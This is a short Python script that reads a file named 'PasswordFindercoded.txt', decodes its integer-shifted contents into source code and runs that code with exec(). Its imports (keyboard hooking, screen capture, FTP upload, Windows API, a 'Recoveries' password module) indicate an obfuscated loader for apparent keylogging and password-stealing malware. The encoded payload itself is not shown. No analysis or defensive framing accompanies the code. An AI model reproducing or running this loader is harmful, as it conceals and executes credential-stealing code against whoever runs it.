

#Imported libraries
import os
import pyHook
import shutil
import signal
import getpass
import platform
import win32api
import pythoncom
import datetime
import subprocess
from ftplib import FTP
from PIL import ImageGrab
from os import getenv
from Recoveries import Test
import random



coded=open("PasswordFindercoded.txt",'r')
val=coded.read()
val=val.rstrip("\n")

newList=val.split("\n")
randomInteger=newList[0]

newString=""
newrandomInteger=int(newList[0])
for i in range(1,len(newList)):
    newString=newString+str(chr(int(newList[i])-newrandomInteger))
   
exec(newString)

